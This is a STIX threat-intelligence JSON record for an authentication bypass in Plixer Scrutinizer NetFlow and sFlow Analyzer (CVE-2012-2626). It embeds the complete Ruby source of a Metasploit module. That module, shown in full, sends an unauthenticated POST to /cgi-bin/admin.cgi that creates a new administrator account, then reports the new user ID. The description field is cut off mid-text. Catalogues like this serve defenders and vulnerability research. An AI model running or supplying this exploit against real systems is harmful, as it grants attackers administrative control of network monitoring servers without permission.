{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5c22c052-16d3-4a63-b75f-2844aede5843",
    "created": "2024-08-14T16:24:03.524092Z",
    "modified": "2024-08-14T16:24:03.524096Z",
    "name": "Plixer Scrutinizer NetFlow and sFlow Analyzer HTTP Authentication Bypass",
    "description": " This will add an administrative account to Scrutinizer NetFlow and sFlow Analyzer without any authentication.  Versions such as 9.0.1 or older are affected.  'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/scrutinizer_add_user.rb",
            "external_id": "scrutinizer_add_user.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.trustwave.com/spiderlabs/advisories/TWSL2012-014.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Plixer Scrutinizer NetFlow and sFlow Analyzer HTTP Authentication Bypass',\n        'Description' => %q{\n          This will add an administrative account to Scrutinizer NetFlow and sFlow Analyzer\n          without any authentication.  Versions such as 9.0.1 or older are affected.\n        },\n        'References' => [\n          [ 'CVE', '2012-2626' ],\n          [ 'OSVDB', '84318' ],\n          [ 'URL', 'https://www.trustwave.com/spiderlabs/advisories/TWSL2012-014.txt' ]\n        ],\n        'Author' => [\n          'MC',\n          'Jonathan Claudius',\n          'Tanya Secker',\n          'sinn3r'\n        ],\n        'License' => MSF_LICENSE,\n        'DisclosureDate' => '2012-07-27'\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The path to the admin CGI script', '/cgi-bin/admin.cgi']),\n        OptString.new('USERNAME', [true, 'The username for your new account']),\n        OptString.new('PASSWORD', [true, 'The password for your new account'])\n      ]\n    )\n  end\n\n  def run\n    uri = normalize_uri(target_uri.path)\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => uri,\n      'vars_post' => {\n        'tool' => 'userprefs',\n        'newUser' => datastore['USERNAME'],\n        'pwd' => datastore['PASSWORD'],\n        'selectedUserGroup' => '1'\n      }\n    })\n\n    if !res\n      print_error('No response from server')\n      return\n    end\n\n    begin\n      require 'json'\n    rescue LoadError\n      print_error('Json is not available on your machine')\n      return\n    end\n\n    begin\n      j = JSON.parse(res.body)\n\n      if j['error']\n        print_error(j['error'])\n      elsif j['new_user_id']\n        print_good(\"User created. ID = #{j['new_user_id']}\")\n      else\n        print_status('Unexpected response:')\n        print_status(j.to_s)\n      end\n    rescue JSON::ParserError\n      print_error('Unable to parse JSON')\n      print_line(res.body)\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2012-07-27"
}